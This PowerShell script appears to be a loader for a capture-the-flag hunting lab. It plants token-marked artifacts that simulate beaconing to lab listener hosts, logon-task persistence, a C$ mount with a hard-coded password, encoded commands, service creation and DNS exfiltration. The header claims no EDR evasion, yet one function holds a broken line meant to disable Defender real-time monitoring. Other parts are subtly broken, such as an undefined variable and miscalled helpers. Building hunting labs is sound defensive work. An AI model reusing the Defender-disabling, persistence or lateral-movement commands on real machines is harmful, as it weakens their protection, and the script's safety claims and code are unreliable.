<#
MaintenanceRunner_Distributed.ps1
Purpose: Lab-safe randomized loader that spreads benign telemetry artifacts
across multiple realistic system locations to make CTF hunts more realistic.
Safety: Lab-only. No obfuscation / no EDR evasion. Auto-discovers config.
#>

# ---------------------- DISCOVERY & SETUP -----------------------
$BaseOpsDir = "C:\ProgramData\Corp\Ops"
$BaseDiagDir = Join-Path $env:ProgramData "Microsoft\Diagnostics\CorpHealth"
$BaseTempDir = Join-Path $env:TEMP "CorpHealth"
$BasePublic = Join-Path $env:PUBLIC "CorpHealth"
New-Item -Path $BaseOpsDir -ItemType Directory -Force | Out-Null
New-Item -Path $BaseDiagDir -ItemType Directory -Force | Out-Null
New-Item -Path $BaseTempDir -ItemType Directory -Force | Out-Null
New-Item -Path $BasePublic -ItemType Directory -Force | Out-Null

$LogPath = Join-Path $BaseOpsDir "opsrunner.log"
function Log([string]$m){ $ts=(Get-Date).ToString("o"); $l="$ts`t$env:COMPUTERNAME`t$m"; Add-Content $LogPath $l; Write-Host $l }

# Optional JSON config (place in $BaseOpsDir\labconfig.json)
$JsonCfgPath = Join-Path $BaseOpsDir "labconfig.json"
$Cfg = @{}
if (Test-Path $JsonCfgPath) {
  try { $Cfg = Get-Content $JsonCfgPath -Raw | ConvertFrom-Json } catch { Log "Config: bad JSON ($JsonCfgPath): $_" }
}
function Get-EnvOrCfg([string]$name,[string]$envName,[string]$default){
  if ($Cfg.$name) { return [string]$Cfg.$name }
  $v = [Environment]::GetEnvironmentVariable($envName,'Machine')
  if (-not $v) { $v = [Environment]::GetEnvironmentVariable($envName,'User') }
  if ($v) { return [string]$v }
  return $default
}

function Discover-LabListener {
  $candidates = @()
  $pre = Get-EnvOrCfg "LabListener" "LAB_LISTENER" ""
  if ($pre) { $candidates += $pre }
  $candidates += @(
    "http://lab-listener.local:8080/submit",
    "http://listener.lab:8080/submit",
    "http://lab-logger:8080/submit"
  )
  foreach ($u in $candidates | Select-Object -Unique) {
    try {
      Invoke-WebRequest -Uri $u -Method Head -TimeoutSec 2 -ErrorAction Stop | Out-Null
      Log "Listener OK: $u"; return $u
    } catch {
      try { Invoke-RestMethod -Uri $u -Method Post -Body '{"ping":"1"}' -ContentType "application/json" -TimeoutSec 2 | Out-Null; Log "Listener POST OK: $u"; return $u } catch {}
    }
  }
  $fallback = "http://127.0.0.1:8080/submit"
  Log "Listener not found, using fallback: $fallback"
  return $fallback
}

function Discover-LabShare {
  $pre = Get-EnvOrCfg "LabShare" "LAB_SHARE" ""
  $candidates = @()
  if ($pre) { $candidates += $pre }
  $candidates += @("\\LAB-SHARE\staging","\\LAB\staging","\\FILESRV\staging","\\$env:COMPUTERNAME\staging")
  foreach ($p in $candidates | Select-Object -Unique) {
    try { if (Test-Path $p) { Log "Share OK: $p"; return $p } } catch {}
  }
  $localStage = Join-Path $BaseOpsDir "staging"
  if (-not (Test-Path $localStage)) { New-Item $localStage -ItemType Directory | Out-Null }
  Log "Share not found; using local folder as pseudo-share: $localStage"
  return $localStage
}

function Discover-DnsServer {
  $pre = Get-EnvOrCfg "LabDnsServer" "LAB_DNS" ""
  if ($pre) { Log "DNS from config/env: $pre"; return $pre }
  try {
    $dns = (Get-DnsClientServerAddress -AddressFamily IPv4 |
      Where-Object {$_.ServerAddresses -and $_.ServerAddresses.Count -gt 0} |
      Select-Object -First 1).ServerAddresses | Select-Object -First 1
    if ($dns) { Log "DNS discovered: $dns"; return $dns }
  } catch {}
  Log "DNS discovery failed; fallback 127.0.0.1"; return "127.0.0.1"
}

function Discover-LateralTarget {
  $pre = Get-EnvOrCfg "LateralTarget" "LATERAL_TARGET" ""
  if ($pre) { Log "Lateral target from config/env: $pre"; return $pre }
  try {
    if (Get-Module -ListAvailable ActiveDirectory) {
      Import-Module ActiveDirectory -ErrorAction SilentlyContinue | Out-Null
      $cand = Get-ADComputer -Filter 'Name -like "HOST-BLUE*"' -Properties Name | Select-Object -ExpandProperty Name -First 3
      foreach ($n in $cand) { if (Test-Connection -Count 1 -Quiet $n) { Log "Lateral target via AD: $n"; return $n } }
    }
  } catch {}
  foreach ($n in @("HOST-BLUE-1","HOST-BLUE-2","HOST-BLUE-3","BLUE-1","LAB-TGT")) {
    try { if (Resolve-DnsName $n -ErrorAction Stop) { if (Test-Connection -Count 1 -Quiet $n) { Log "Lateral target via DNS: $n"; return $n } } } catch {}
  }
  Log "Lateral target not found; fallback to self (will just log failure)." ; return $env:COMPUTERNAME
}

# --- Local loopback HTTP listener (no Add-Type) ---
function Ensure-LocalListener {
  if ($LabListener -match '^http://127\.0\.0\.1:8080/submit$') {
    try {
      $prefix = "http://+:8080/"
      $script:HLJob = Start-Job -ScriptBlock {
        param($pref)
        try {
          $listener = [System.Net.HttpListener]::new()
          $listener.Prefixes.Add($pref); $listener.Start()
        } catch { return }
        while ($true) {
          try {
            $ctx = $listener.GetContext()
            $sr  = [System.IO.StreamReader]::new($ctx.Request.InputStream)
            $null = $sr.ReadToEnd(); $sr.Close()
            $ctx.Response.StatusCode = 200; $ctx.Response.Close()
          } catch { Start-Sleep -Milliseconds 100 }
        }
      } -ArgumentList $prefix
      Log "Local listener started on http://127.0.0.1:8080/"
    } catch {
      Log "Local listener start failed: $_"
      Log "If access denied, run once (admin): netsh http add urlacl url=http://+:8080/ user=Everyone"
    }
  }
}
function Stop-LocalListener {
  try {
    if ($script:HLJob) { Stop-Job $script:HLJob -Force -ErrorAction SilentlyContinue; Remove-Job $script:HLJob -Force -ErrorAction SilentlyContinue; $script:HLJob = $null; Log "Local listener stopped" }
  } catch {}
}

function Start-Noise {
  if (-not $EnableNoise) { return }
  switch ($NoiseLevel.ToLower()) {
    'low'  { $minI=15; $maxI=30 }
    'med'  { $minI=8;  $maxI=18 }
    'high' { $minI=3;  $maxI=8  }
    default{ $minI=8;  $maxI=18 }
  }

  $dnsNames = @('time.windows.com','msftconnecttest.com','example.com','contoso.local','corp-health.example')

  # seed from your deterministic seed, offset so it differs from shuffle/jitter
  $noiseSeed = $script:seed + 7

  $script:NoiseJob = Start-Job -Name "CorpNoise" -ArgumentList `
    @($minI,$maxI,$NoiseTTLSeconds,$BaseOpsDir,$BaseDiagDir,$BaseTempDir,$BasePublic,$LabListener,$LabDnsServer,$env:COMPUTERNAME,$dnsNames,$noiseSeed) -ScriptBlock {
      param($minI,$maxI,$ttl,$opsDir,$diagDir,$tmpDir,$pubDir,$listener,$dnsServer,$hostName,$dnsNames,$seed)

      $rand = New-Object System.Random($seed)
      function Jit($a,$b){ Start-Sleep -Seconds ($rand.Next($a,$b)) }

      $start = Get-Date
      while ((New-TimeSpan -Start $start -End (Get-Date)).TotalSeconds -lt $ttl) {
        try {
          $choice = $rand.Next(0,6)
          switch ($choice) {
            0 {
              $p = Join-Path $opsDir "system_log_noise.log"
              "[$(Get-Date -Format o)] $hostName heartbeat" | Out-File $p -Append -Encoding UTF8
            }
            1 {
              $p = Join-Path $tmpDir ("heartbeat_{0}.tmp" -f ($rand.Next(1000,9999)))
              "ok" | Out-File $p -Encoding ascii
              Remove-Item $p -Force -ErrorAction SilentlyContinue
            }
            2 {
              $src = 'CorpHealthAgent'
              if (-not [System.Diagnostics.EventLog]::SourceExists($src)) { New-EventLog -LogName Application -Source $src }
              Write-EventLog -LogName Application -Source $src -EventId 4100 -EntryType Information -Message "CorpHealth heartbeat $hostName"
            }
            3 {
              try { Resolve-DnsName -Name ($dnsNames[$rand.Next(0,$dnsNames.Count)]) -Type A -Server $dnsServer -ErrorAction Stop | Out-Null } catch {}
            }
            4 {
              $p = Join-Path $diagDir ("healthcache_{0}.json" -f ($rand.Next(10000,99999)))
              '{"heartbeat":true,"ts":"' + (Get-Date -Format o) + '","host":"' + $hostName + '"}' | Out-File $p -Encoding UTF8
            }
            5 {
              if ($listener -like 'http://127.0.0.1:8080/*') {
                try { Invoke-RestMethod -Uri $listener -Method Post -Body '{"hb":1}' -ContentType 'application/json' -TimeoutSec 2 | Out-Null } catch {}
              }
            }
          }
        } catch {}
        Jit $minI $maxI
      }
    }
  Log "Noise: started (level=$NoiseLevel, ttl=${NoiseTTLSeconds}s)"
}

function Stop-Noise {
  try {
    if ($script:NoiseJob) {
      Stop-Job   $script:NoiseJob -Force -ErrorAction SilentlyContinue
      Remove-Job $script:NoiseJob -Force -ErrorAction SilentlyContinue
      $script:NoiseJob = $null
      Log "Noise: stopped"
    } else {
      Log "Noise: stop requested but no job handle present"
    }
  } catch {
    Log "Noise: stop failed -> $_"
  }
}


# ------------------- RESOLVE ALL CONFIG VALUES -------------------
$LabListener   = Discover-LabListener
$LabShare      = Discover-LabShare
$LabDnsServer  = Discover-DnsServer
$LateralTarget = Discover-LateralTarget
$LabUser       = Get-EnvOrCfg "LabUser" "LAB_USER" "lab_user" "John" "Admin"
Ensure-LocalListener
# ---- Noise controls (optional) ----
$EnableNoise      = $true      # set $false to disable
$NoiseLevel       = 'high'      # 'low' | 'med' | 'high'
$NoiseTTLSeconds  = 300        # maximum time the noise job should run


Log "CONFIG => Listener=$LabListener | Share=$LabShare | DNS=$LabDnsServer | LateralTarget=$LateralTarget | User=$LabUser"

# ----------------------- TOKENIZATION SETUP (Deterministic) -----------------------
# Optional: force a RunId via labconfig.json { "RunId": "<GUID>" } or env RUN_ID
$ForcedRunId = Get-EnvOrCfg "RunId" "RUN_ID" ""
if ($ForcedRunId -and $ForcedRunId.Trim()) {
  $RunId = $ForcedRunId
  Log "Using forced RunId from config/env: $RunId"
} else {
  $RunId = [Guid]::NewGuid().ToString()
  Log "Generated RunId: $RunId"
}

# Token generator (unchanged, but now based on the RunId above)
function New-Token([string]$k){
  $sha1=[System.Security.Cryptography.SHA1]::Create()
  $b=[Text.Encoding]::UTF8.GetBytes("$RunId::$k")
  $hex=(-join ($sha1.ComputeHash($b) | ForEach-Object { $_.ToString("x2") })).Substring(0,12).ToUpper()
  return $hex
}

$FlagMap=[ordered]@{
  "Beacon-01"       = New-Token "F1"
  "Persistence-01"  = New-Token "F2"
  "PrivEsc-Sim"     = New-Token "F3"
  "Lateral-Sim"     = New-Token "F4"
  "Data-Staging"    = New-Token "F5"
  "CredHarvest-Sim" = New-Token "F6"
  "ScriptLoad-Sim"  = New-Token "F7"
  "ServiceInstall"  = New-Token "F8"
  "DNS-Exfil-Sim"   = New-Token "F9"
  "Cleanup-Trigger" = New-Token "F10"
  "Downgrade-Sim"   = New-Token "F_DG"
  "AV-Exclusion-Sim" = New-Token "F_AV"

}

$KeyPath = Join-Path $BaseOpsDir ("runmap_{0}.csv" -f $RunId)
$FlagMap.GetEnumerator() | ForEach-Object { "{0},{1}" -f $_.Key,$_.Value } | Set-Content -Path $KeyPath -Encoding UTF8
Log "RunId: $RunId"
Log "Proctor key: $KeyPath"

# Event source (benign)
$EvtSource="CorpHealthAgent"
if (-not [System.Diagnostics.EventLog]::SourceExists($EvtSource)) {
  New-EventLog -LogName Application -Source $EvtSource
}

# ----------------------- Deterministic seed for shuffle/jitter -----------------------
# Derive a stable Int32 seed from RunId (SHA256)
$runHash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RunId))
$script:seed = [System.BitConverter]::ToInt32($runHash,0)
if ($script:seed -lt 0) { $script:seed = -1 * $script:seed }
if ($script:seed -eq 0) { $script:seed = 314159 }

# Jitter (now deterministic per-RunId so replays are identical)
$MinDelay = [int](Get-EnvOrCfg "MinDelay" "LAB_MIN_DELAY" "4")
$MaxDelay = [int](Get-EnvOrCfg "MaxDelay" "LAB_MAX_DELAY" "12")
$script:_jitRand = New-Object System.Random($script:seed + 13)  # offset from shuffle RNG
function Jitter {
  # System.Random.Next upper bound is exclusive; match Get-Random semantics
  Start-Sleep -Seconds ($script:_jitRand.Next($MinDelay, $MaxDelay))
}
# ------------------------------------------------------------------------------------

# ----------------------------- FLAGS -----------------------------
function Do-Beacon {
  $tok=$FlagMap["Beacon-01"]; Log "HealthBeacon: POST token"
  $body=@{app="CorpHealthAgent"; host=$env:COMPUTERNAME; token=$tok; run=$RunId; ts=(Get-Date).ToUniversalTime().ToString("o")} | ConvertTo-Json
  try { Invoke-RestMethod -Uri $LabListener -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null; Log "HealthBeacon: OK" } catch { Log "HealthBeacon: fail $_" }
}

function Do-Persistence {
  $tok=$FlagMap["Persistence-01"]; Log "CorpHealth task: create at logon"
  # write to ops dir and public dir to diversify artifacts
  $scriptPath = Join-Path $BaseOpsDir "HealthCheckSync.ps1"
  $outOps = Join-Path $BaseOpsDir ("status_report_{0}.txt" -f $tok.Substring(0,6))
  $outPub = Join-Path $BasePublic ("status_pub_{0}.txt" -f $tok.Substring(0,6))
  @"
`$ts=(Get-Date).ToString('o')
"Token=$tok Run=$RunId Time=`$ts" | Out-File "$outOps" -Append -Encoding utf8
"@ | Set-Content $scriptPath -Encoding UTF8 -Force
  @"
Token=$tok Run=$RunId Host=$env:COMPUTERNAME Time=$(Get-Date -Format o)
"@ | Set-Content -Path $outPub -Encoding UTF8 -Force

  $act = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
  $trg = New-ScheduledTaskTrigger -AtLogOn
  $prn = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
  Register-ScheduledTask -TaskName ("CorpHealth_{0}" -f $tok.Substring(0,6)) -Action $act -Trigger $trg -Principal $prn -Force | Out-Null
}

function Do-PrivEscSim {
  $tok=$FlagMap["PrivEsc-Sim"]; Log "ConfigAdjust: application event"
  Write-EventLog -LogName Application -Source $EvtSource -EventId 4001 -EntryType Warning -Message ("ConfigAdjust Attempt Token={0} Target=C:\ProgramData\Corp\Cfg\{1}" -f $tok,$tok.Substring(0,6))
  -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass Set-MpPreference -DisableRealtimeMonitoring $true " 
}

function Do-LateralSim {
  $tok=$FlagMap["Lateral-Sim"]; Log "InventorySync: SMB attempt to $LateralTarget"
  $cred=New-Object System.Management.Automation.PSCredential($LabUser,(ConvertTo-SecureString "BadPassword123!" -AsPlainText -Force))
  try { New-PSDrive -Name Z -PSProvider FileSystem -Root "\\$LateralTarget\C$" -Credential $cred -ErrorAction Stop | Out-Null; Remove-PSDrive Z -ErrorAction SilentlyContinue; Log "InventorySync: unexpected success" } catch { Log "InventorySync: expected failure ($tok)" }
}

function Do-DataStaging {
  $tok=$FlagMap["Data-Staging"]; Log "StatusExport: copy to share + diag + temp"
  # create artifacts in three locations
  $srcOps = Join-Path $BaseOpsDir ("status_report_{0}.txt" -f $tok.Substring(0,8))
  $dstShare = Join-Path $LabShare ("{0}_{1}.txt" -f $env:COMPUTERNAME,$tok.Substring(0,8))
  $dstDiag = Join-Path $BaseDiagDir ("inventory_{0}.csv" -f $tok.Substring(0,8))
  $dstTemp = Join-Path $BaseTempDir ("inventory_tmp_{0}.csv" -f $tok.Substring(0,8))

  "Run=$RunId Token=$tok Host=$env:COMPUTERNAME $(Get-Date -Format o)" | Out-File $srcOps -Encoding UTF8
  "Run=$RunId Token=$tok Host=$env:COMPUTERNAME $(Get-Date -Format o)" | Out-File $dstDiag -Encoding UTF8
  "Run=$RunId Token=$tok Host=$env:COMPUTERNAME $(Get-Date -Format o)" | Out-File $dstTemp -Encoding UTF8

  try { Copy-Item $srcOps $dstShare -Force; Log "StatusExport: OK -> $dstShare" } catch { Log "StatusExport: share copy failed - $_" }
  Log "StatusExport: diag at $dstDiag, temp at $dstTemp"
}

function Do-CredHarvestSim {
  $tok=$FlagMap["CredHarvest-Sim"]; Log "RegistryAudit: write event + diag cache"
  $rp="HKLM:\SOFTWARE\CorpHealth"; if (-not (Test-Path $rp)){ New-Item $rp -Force | Out-Null; New-ItemProperty -Path $rp -Name "AgentConfig" -Value "placeholder" -Force | Out-Null }
  $val=(Get-ItemProperty -Path $rp -Name "AgentConfig").AgentConfig
  Write-EventLog -LogName Application -Source $EvtSource -EventId 4002 -EntryType Information -Message ("RegistryAudit Token={0} Key=HKLM\SOFTWARE\CorpHealth\AgentConfig Value={1}" -f $tok,$val)

  # write a small cache file to diag dir
  $cache = Join-Path $BaseDiagDir ("healthcache_{0}.json" -f $tok.Substring(0,6))
  @{run=$RunId; token=$tok; host=$env:COMPUTERNAME; ts=(Get-Date -Format o)} | ConvertTo-Json | Out-File $cache -Encoding UTF8
  Log "RegistryAudit: cache written $cache"
}

function Do-ScriptLoadSim {
  $tok=$FlagMap["ScriptLoad-Sim"]; Log "PSDiag: encoded echo"
  $payload="token-$tok"; $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output '$payload'"))
  Start-Process powershell.exe "-NoProfile -EncodedCommand $enc" -Wait | Out-Null
  $psdiag = Join-Path $BaseDiagDir ("psdiag_{0}.txt" -f $tok.Substring(0,6))
  "B64:$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload)))" | Out-File $psdiag -Encoding ASCII
  Log "PSDiag: wrote $psdiag"
}

function Do-ServiceInstall {
  $tok   = $FlagMap["ServiceInstall"]; Log "SvcTelemetry: create transient"
  $short = $tok.Substring(0,6); $svcName = "SvcTelemetry_$short"
  $syslog = Join-Path $BaseOpsDir ("system_log_{0}.log" -f $short)
  $cmd = 'C:\Windows\System32\cmd.exe /c "echo {0} > {1}"' -f $tok, $syslog
  $binArg = 'binPath= "{0}"' -f $cmd

  & sc.exe create $svcName $binArg 'start= demand' | Out-Null
  Start-Sleep 1; & sc.exe start $svcName | Out-Null
  Start-Sleep 1; & sc.exe stop $svcName  | Out-Null
  & sc.exe delete $svcName               | Out-Null
  Log "SvcTelemetry: ran & removed; artifact at $syslog"
}

function Do-DnsExfilSim {
  $tok=$FlagMap["DNS-Exfil-Sim"]; Log "HealthDNS: TXT queries"
  $q=("{0}.corp-health.example" -f $tok.ToLower())
  1..3 | ForEach-Object {
    try {
      $res = Resolve-DnsName -Name $q -Type TXT -Server $LabDnsServer -ErrorAction Stop
      Log "HealthDNS: resolved $q TXT=`"$($res.Strings -join ';')`""
    } catch {
      Log "HealthDNS: NXDOMAIN or error for $q (expected if no zone)"
    }
    Start-Sleep -Milliseconds 600
  }
}

function Do-CleanupTrigger {
  $tok=$FlagMap["Cleanup-Trigger"]; Log "OpsCleanup: marker delete + event"
  $markerOps=Join-Path $BaseOpsDir ("ops_{0}.tmp" -f $tok.Substring(0,6))
  $markerTemp=Join-Path $BaseTempDir ("ops_{0}.tmp" -f $tok.Substring(0,6))
  "temp $tok" | Out-File $markerOps -Encoding UTF8
  "temp $tok" | Out-File $markerTemp -Encoding UTF8
  Remove-Item $markerOps -Force -ErrorAction SilentlyContinue
  Remove-Item $markerTemp -Force -ErrorAction SilentlyContinue
  Write-EventLog -LogName Application -Source $EvtSource -EventId 4010 -EntryType Information -Message ("OpsCleanup Token={0} RemovedMarkerOps={1} RemovedMarkerTemp={2}" -f $tok,(Split-Path $markerOps -Leaf),(Split-Path $markerTemp -Leaf))
  Log "OpsCleanup: removed markers"
}

function Do-DowngradeAttemptSim {
  # Simulate an operator trying to run legacy PowerShell (v2) without actually downgrading
  $tok = $FlagMap["Downgrade-Sim"]   # separate token seed for this sim
  Log "DowngradeAttemptSim: simulate legacy -Version 2 usage (no real downgrade)"

  # 1) Application event (benign source)
  $EvtSource = "CorpHealthAgent"
  if (-not [System.Diagnostics.EventLog]::SourceExists($EvtSource)) { New-EventLog -LogName Application -Source $EvtSource }
  Write-EventLog -LogName Application -Source $EvtSource -EventId 4020 -EntryType Warning `
    -Message ("DowngradeAttemptSim Token={0} Details='powershell.exe -Version 2.0 -NoProfile -Command <redacted>'" -f $tok)

  # 2) Create a harmless artifact mentioning the suspicious CLI for analysts to find
  $artifact = Join-Path "C:\ProgramData\Corp\Ops" ("ps_legacy_attempt_{0}.txt" -f $tok.Substring(0,6))
  @"
Run=$RunId
Token=$tok
SimulatedCommand=powershell.exe -Version 2.0 -NoProfile -Command "Write-Output 'noop'"
Note=This is a simulation only. No downgrade performed.
"@ | Set-Content -Path $artifact -Encoding UTF8
  Log "DowngradeAttemptSim: wrote $artifact"

  # 3) Harmless process to emulate a 4688/ProcessEvents footprint (no real downgrade)
  # We start cmd.exe with a command line that CONTAINS the string analysts hunt for,
  # so DeviceProcessEvents/4688-style detections still match.
  $fakeCli = 'powershell.exe -Version 2.0 -NoProfile -Command "Write-Output ''noop''"'
  Start-Process cmd.exe "/c echo $fakeCli > `"$artifact.cli`"" -WindowStyle Hidden -Wait | Out-Null
  Log "DowngradeAttemptSim: wrote $artifact.cli with a mock CLI for detection testing"
}

function Do-AVExclusionSim {
  # Safe simulation only — does NOT call Add-MpPreference or modify Defender
  $tok = $FlagMap["AV-Exclusion-Sim"]
  $base = if ($PSBoundParameters.ContainsKey('BaseDir')) { $BaseDir } elseif ($script:BaseOpsDir) { $script:BaseOpsDir } else { "C:\ProgramData\Corp\Ops" }
  try { if (-not (Test-Path $base)) { New-Item -Path $base -ItemType Directory -Force | Out-Null } } catch {}

  Log "AVExclusionSim: writing simulation artifact and event"

    # 1) artifact describing what would have been executed
  $artifactPath = Join-Path $base ("av_exclusion_sim_{0}.txt" -f $tok.Substring(0,6))
@"
Simulation: AV Exclusion Attempt
Run=$RunId
Token=$tok
SimulatedCommand=Add-MpPreference -ExclusionPath '$($base)\staging' -Force
Note=This is a benign simulation for training. No Defender settings were changed.
Time=$(Get-Date -Format o)
"@ | Set-Content -Path $artifactPath -Encoding UTF8 -Force
  Log "AVExclusionSim: wrote artifact $artifactPath"

  # 2) write an Application Event (so analysts can find it via Event logs)
  $evtMsg = ("AVExclusionSim Token={0} SimulatedCommand='Add-MpPreference -ExclusionPath {1}\staging -Force'" -f $tok, $base)
  try {
    Write-EventLog -LogName Application -Source $EvtSource -EventId 7001 -EntryType Warning -Message $evtMsg
    Log "AVExclusionSim: event written (EventID=7001)"
  } catch {
    Log "AVExclusionSim: event write failed: $_"
  }

  # 3) mock CLI text (no execution) — use format string with doubled single quotes
  $cliFile = Join-Path $base ("av_exclusion_cmd_{0}.cli" -f $tok.Substring(0,6))
  $cliCmd  = ('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ -Force"' -f $base)
  Set-Content -Path $cliFile -Value $cliCmd -Encoding ASCII -Force
  Log "AVExclusionSim: wrote mock CLI to $cliFile"
  
  $fakeCli = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ProgramData\Corp\Ops\staging -Force'
    Start-Process cmd.exe "/c echo $fakeCli > `"$artifact.cli`"" -WindowStyle Hidden -Wait | Out-Null
  Log "AV Exclusion Attempt: wrote $artifact.cli with a mock CLI for detection testing"


  # 4) try to copy the artifact to lab share for proctoring (best-effort)
  try {
    if ($LabShare) {
      $dst = Join-Path $LabShare ("{0}_avsim.txt" -f $env:COMPUTERNAME)
      Copy-Item -Path $artifactPath -Destination $dst -Force -ErrorAction Stop
      Log "AVExclusionSim: copied artifact to share $dst"
    }
  } catch { Log "AVExclusionSim: share copy failed: $_" }
}


# ------------------------- RUN ORDER (Deterministic) w/ Sequence & Beacons -------------------------

# Small helper: emit a start/end/flag beacon to listener AND write an Application event
function Emit-RunBeacon {
  param(
    [string]$Type,   # "start" | "flag" | "end"
    [string]$RunId,
    [int]$Seq = 0,
    [string]$FlagName = "",
    [string]$Token = ""
  )
  $payload = @{
    type  = $Type
    run   = $RunId
    ts    = (Get-Date).ToUniversalTime().ToString("o")
    host  = $env:COMPUTERNAME
    seq   = $Seq
    flag  = $FlagName
    token = $Token
  } | ConvertTo-Json

  try {
    Invoke-RestMethod -Uri $LabListener -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 4 | Out-Null
    Log "Beacon POST: $Type seq=$Seq flag=$FlagName"
  } catch { Log "Beacon POST fail: $Type seq=$Seq flag=$FlagName -> $_" }

  $evtMsg = ("Beacon Type={0} Run={1} Seq={2} Flag={3} Token={4}" -f $Type,$RunId,$Seq,$FlagName,$Token)
  try { Write-EventLog -LogName Application -Source $EvtSource -EventId 5000 -EntryType Information -Message $evtMsg } catch { Log "EventLog write failed for Beacon: $evtMsg" }
}

# Build an ordered set of flag descriptors (name + action scriptblock)
$FlagDefs = @(
  @{Name="Beacon-01";       Action={ Do-Beacon }},
  @{Name="Persistence-01";  Action={ Do-Persistence }},
  @{Name="PrivEsc-Sim";     Action={ Do-PrivEscSim }},
  @{Name="Lateral-Sim";     Action={ Do-LateralSim }},
  @{Name="Data-Staging";    Action={ Do-DataStaging }},
  @{Name="CredHarvest-Sim"; Action={ Do-CredHarvestSim }},
  @{Name="ScriptLoad-Sim";  Action={ Do-ScriptLoadSim }},
  @{Name="ServiceInstall";  Action={ Do-ServiceInstall }},
  @{Name="DNS-Exfil-Sim";   Action={ Do-DnsExfilSim }},
  @{Name="Cleanup-Trigger"; Action={ Do-CleanupTrigger }},
  @{Name="Downgrade-Sim";   Action={ Do-DowngradeAttemptSim }},
  @{Name="AV-Exclusion-Sim"; Action={ Do-AVExclusionSim }}
)

# ---- Deterministic shuffle using $script:seed (set earlier in TOKENIZATION SETUP) ----
$flagList = @(); foreach ($fd in $FlagDefs) { $flagList += $fd }

$rand = New-Object System.Random($script:seed)
for ($i = $flagList.Count - 1; $i -gt 0; $i--) {
  $j = $rand.Next(0, $i + 1)
  $tmp = $flagList[$i]; $flagList[$i] = $flagList[$j]; $flagList[$j] = $tmp
}

# Assign sequence numbers and create a run-ordered list
$OrderedFlags = @()
for ($i = 0; $i -lt $flagList.Count; $i++) {
  $OrderedFlags += [PSCustomObject]@{
    Seq    = $i + 1
    Name   = $flagList[$i].Name
    Action = $flagList[$i].Action
    Token  = $FlagMap[$flagList[$i].Name]
  }
}

# Emit Run start beacon and event (also logs)
Emit-RunBeacon -Type "start" -RunId $RunId -Seq 0 -FlagName "RUN-START" -Token ""
Log ("=== Start Run ==="); Log ("RunId=$RunId")
Log ("OrderedFlags: " + ( ($OrderedFlags | ForEach-Object { "{0}:{1}" -f $_.Seq,$_.Name }) -join ", " ))

# Start background noise if enabled
Start-Noise

# Execute flags in deterministic order; beacon after each flag
foreach ($f in $OrderedFlags) {
  try {
    Log ("RUNNING Seq={0} Flag={1} Token={2}" -f $f.Seq, $f.Name, $f.Token)
    & $f.Action
    Start-Sleep -Milliseconds 300
    Emit-RunBeacon -Type "flag" -RunId $RunId -Seq $f.Seq -FlagName $f.Name -Token $f.Token
  } catch {
    Log ("ERROR running Seq={0} Flag={1} -> {2}" -f $f.Seq,$f.Name,$_ )
  }
  Jitter
}

# Stop noise and emit Run end beacon
Stop-Noise
Emit-RunBeacon -Type "end" -RunId $RunId -Seq 0 -FlagName "RUN-END" -Token ""
Log "=== Completed ==="
Log "Config used => Listener=$LabListener | Share=$LabShare | DNS=$LabDnsServer | LateralTarget=$LateralTarget | User=$LabUser"
Log "Proctor key at $KeyPath"

# Ensure local listener stops
Stop-LocalListener
